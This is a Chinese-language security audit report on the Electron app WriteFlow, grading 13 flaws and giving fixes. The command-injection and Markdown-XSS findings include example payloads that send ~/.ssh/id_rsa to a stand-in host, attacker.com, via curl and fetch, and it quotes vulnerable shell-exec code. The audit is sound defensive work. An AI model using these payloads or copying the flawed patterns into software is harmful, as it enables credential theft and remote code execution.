# WriteFlow 資安評估報告

**評估日期：** 2026-02-28
**評估者：** 🔐 Alex（CISSP / OSCP 認證資安工程師）
**應用版本：** WriteFlow v0.1.0
**技術堆疊：** Electron 39 + Vue 3.5 + TypeScript 5.9

---

## 執行摘要

WriteFlow 整體架構採用了若干 Electron 安全最佳實踐（`contextIsolation: true`、`nodeIntegration: false`），但在 IPC 通訊層、命令執行層及 Markdown 渲染層存在**多個嚴重或高風險漏洞**。最主要的攻擊面集中在主程序服務層，任何能夠控制 renderer 輸出或注入惡意 Markdown 的攻擊者，均可能透過這些漏洞實現**任意指令執行（RCE）**或**任意檔案讀寫**。

**整體資安評分：42 / 100**

---

## 漏洞清單

---

### 🔴 VULN-001：Git 服務指令注入（Command Injection）

**嚴重等級：Critical**
**CVSS 估算：9.8（AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H）**
**位置：** `src/main/services/GitService.ts`

**描述：**

`GitService.ts` 使用 `execAsync`（即 `child_process.exec` 的 Promise 版本）來執行 git 指令。`exec` 預設透過系統 Shell（bash/cmd.exe）執行，因此任何未充分轉義的參數都可能注入惡意 Shell 指令。

**具體漏洞點：**

```typescript
// 1. commit() - 只轉義雙引號，未處理反引號、$()、換行符
const escapedMessage = message.replace(/"/g, '\\"')
const { stdout, stderr } = await execAsync(
  `git commit ${addFlag}-m "${escapedMessage}"`,  // ← 注入點
  { cwd: repoPath }
)

// 2. push() - remote 和 branch 完全未轉義
const { stdout, stderr } = await execAsync(
  `git push ${remote}${branchArg}`,  // ← 完全無保護
  { cwd: repoPath }
)

// 3. add() - paths 用雙引號包裹，但仍有繞過方式
const pathArgs = paths.map(p => `"${p}"`).join(' ')
await execAsync(`git add ${pathArgs}`, { cwd: repoPath })
```

**攻擊範例（Linux/macOS）：**

若攻擊者能控制 commit 訊息（例如透過惡意 Markdown frontmatter），可注入：

```
正常標題`; curl http://attacker.com/$(cat ~/.ssh/id_rsa | base64); #
```

**影響範圍：** 任意指令執行（RCE）、資料外洩、系統破壞

**修復建議：**

```typescript
// 安全的做法：使用 spawn 傳入陣列
import { execFile } from 'child_process'
const execFileAsync = promisify(execFile)
await execFileAsync('git', ['commit', '-m', message], { cwd: repoPath })
```

---

### 🔴 VULN-002：IPC 無路徑存取限制（Path Traversal / Unrestricted File Access）

**嚴重等級：Critical**
**CVSS 估算：9.1（AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N）**
**位置：** `src/main/main.ts`、`src/main/services/FileService.ts`

**描述：**

主程序透過 IPC 暴露了完整的檔案系統操作，且**完全沒有路徑白名單驗證**。任何能影響 renderer 的攻擊者（例如惡意 Markdown 中的 XSS）都可讀寫系統任意位置的檔案。

```typescript
// main.ts - 無任何路徑驗證
ipcMain.handle('read-file', (_, path: string) => fileService.readFile(path))
ipcMain.handle('write-file', (_, path: string, content: string) => fileService.writeFile(path, content))
ipcMain.handle('delete-file', (_, path: string) => fileService.deleteFile(path))
```

**修復建議：**

```typescript
// 在主程序建立路徑驗證中介層
function validatePath(filePath: string, allowedRoots: string[]): string {
  const resolved = resolve(filePath)
  const allowed = allowedRoots.some(root =>
    resolved.startsWith(resolve(root) + path.sep) || resolved === resolve(root)
  )
  if (!allowed) throw new Error(`Path access denied: ${filePath}`)
  return resolved
}
```

---

### 🔴 VULN-003：Linux 建置停用 Chromium 沙箱（--no-sandbox）

**嚴重等級：Critical**
**CVSS 估算：9.0（AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H）**
**位置：** `electron-builder.yml`

**描述：**

```yaml
linux:
  executableArgs:
    - --no-sandbox  # ← 危險！停用最後一道防線
```

Chromium 沙箱是 Electron 應用程式的最後一道防線。在 renderer 被 XSS 攻陷後，沙箱可防止攻擊者逃逸至主機系統。

**修復建議：** 移除 `--no-sandbox`，或只在有記錄的受限環境（如 Docker 無特權容器）中使用。

---

### 🟠 VULN-004：MarkdownIt 啟用 HTML 模式（XSS 風險）

**嚴重等級：High**
**CVSS 估算：8.1（AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N）**
**位置：** `src/services/MarkdownService.ts`

**描述：**

```typescript
this.md = new MarkdownIt({
  html: true,    // ← 允許 Markdown 中嵌入任意 HTML
})
```

攻擊者可在 `.md` 檔案中嵌入 `<script>` 標籤：

```markdown
<script>
  window.electronAPI.readFile('/Users/user/.ssh/id_rsa').then(data => {
    fetch('https://attacker.com/steal?data=' + btoa(data))
  })
</script>
```

**修復建議：**

```typescript
import DOMPurify from 'dompurify'

render(content: string): string {
  const rawHtml = this.md.render(processedContent)
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'code', 'pre', /* ... */],
  })
}
```

---

### 🟠 VULN-005：ProcessService 使用 shell:true

**嚴重等級：High**
**CVSS 估算：7.8**
**位置：** `src/main/services/ProcessService.ts`

```typescript
this.devServerProcess = spawn('npm', ['run', 'dev'], {
  shell: true  // ← 不必要且危險
})
```

**修復建議：** 改為 `shell: false`。

---

### 🟠 VULN-006：IPC 輸入完全未驗證

**嚴重等級：High**
**CVSS 估算：7.5**

多個 IPC handler 使用 `any` 類型且無執行時期驗證。TypeScript 類型系統僅在編譯期有效，IPC 通訊傳遞的是 JSON，執行期完全沒有保護。

**修復建議：** 使用 `zod` 加入執行期 Schema 驗證。

---

### 🟠 VULN-007：ImageService 大量直接呼叫 window.electronAPI

**嚴重等級：High**
**CVSS 估算：7.4**

```typescript
const stats = await (window.electronAPI as any).getFileStats(imagesPath)
await (window.electronAPI as any).writeFileBuffer(targetPath, buffer)  // 此 IPC 根本未在 main.ts 中定義！
```

`writeFileBuffer` 呼叫了一個**不存在的 IPC handler**，說明有未完成的功能且缺乏整合測試。

---

### 🟡 VULN-008：CSP 設定不完整

**嚴重等級：Medium**

缺少 `frame-ancestors 'none'`、`base-uri 'self'`、`object-src 'none'` 等重要指令。

---

### 🟡 VULN-009：未設定程式碼簽章

**嚴重等級：Medium**

`electron-builder.yml` 中完全未設定程式碼簽章，使用者無法驗證安裝包的真實性。

---

### 🟡 VULN-010：配置檔案無完整性驗證

**嚴重等級：Medium**

```typescript
const configData = await fs.readFile(this.configPath, 'utf-8')
return JSON.parse(configData)  // 無 schema 驗證
```

---

### 🟡 VULN-011：FileScannerService 在 renderer 直接 import chokidar

**嚴重等級：Medium**

`chokidar` 是 Node.js 模組，在 `contextIsolation: true` + `nodeIntegration: false` 下不應在 renderer 使用。這揭示了架構設計混亂，若未來錯誤恢復 `nodeIntegration: true`，後果嚴重。

---

### 🟢 VULN-012：缺乏更新機制完整性驗證

**嚴重等級：Low** — 目前無自動更新，未來實作時需確保 HTTPS + 程式碼簽章 + 雜湊校驗。

---

### 🟢 VULN-013：ProcessService 固定 2 秒等待

**嚴重等級：Low** — `setTimeout 2000` 固定等待，無伺服器就緒確認機制。

---

## 整體風險矩陣

| 嚴重等級 | 漏洞數量 | 代號 |
|----------|----------|------|
| Critical | 3 | VULN-001, VULN-002, VULN-003 |
| High | 4 | VULN-004, VULN-005, VULN-006, VULN-007 |
| Medium | 4 | VULN-008, VULN-009, VULN-010, VULN-011 |
| Low | 2 | VULN-012, VULN-013 |
| **合計** | **13** | |

---

## Top 5 立即修復項目

| 優先 | 漏洞 | 預估修復時間 |
|------|------|-------------|
| #1 | VULN-001 GitService RCE | 4 小時 |
| #2 | VULN-002 IPC 路徑白名單驗證 | 6 小時 |
| #3 | VULN-003 Linux 沙箱設定 | 30 分鐘 |
| #4 | VULN-004 MarkdownIt XSS | 3 小時 |
| #5 | VULN-006 IPC 輸入 Schema 驗證 | 8 小時 |

---

## 整體資安評分詳細

| 評估面向 | 得分 | 說明 |
|---------|------|------|
| Electron 基礎設定 | 70/100 | contextIsolation ✓、nodeIntegration ✓ |
| IPC 通訊安全 | 20/100 | 無路徑驗證、無類型驗證、無速率限制 |
| 指令執行安全 | 5/100 | GitService 多處 exec + 未轉義 = Critical RCE |
| XSS 防護 | 30/100 | html:true 無 sanitize；CSP 有但不完整 |
| 程式碼簽章 | 0/100 | 完全未實作 |
| 依賴套件安全 | 65/100 | 版本較新；js-yaml v4（安全版） |
| 資料儲存安全 | 60/100 | 路徑設定明文但低敏感性 |
| 沙箱設定 | 40/100 | macOS/Win 正常，Linux 沙箱被停用 |

**整體評分：42 / 100**
**評級：需立即修復後才可考慮 Production 部署**

---

## 依賴套件安全性摘要

| 套件 | 版本 | 狀態 | 備注 |
|------|------|------|------|
| `electron` | ^39.2.7 | ✅ 較新版 | 注意跟進安全公告 |
| `markdown-it` | ^14.1.0 | ⚠️ | `html:true` 造成風險 |
| `js-yaml` | ^4.1.1 | ✅ | v4 已修復 v3 的安全問題 |
| `highlight.js` | ^11.11.1 | ✅ | 較新版 |
| `dompurify` | **未引入** | ❌ | **應立即引入** |
| `zod` | **未引入** | ❌ | **建議引入作執行期驗證** |

建議定期執行：

```bash
pnpm audit          # 檢查已知 CVE
pnpm outdated       # 檢查過時套件
```

*本報告基於原始碼靜態分析，建議在修復關鍵漏洞後進行滲透測試複驗。*
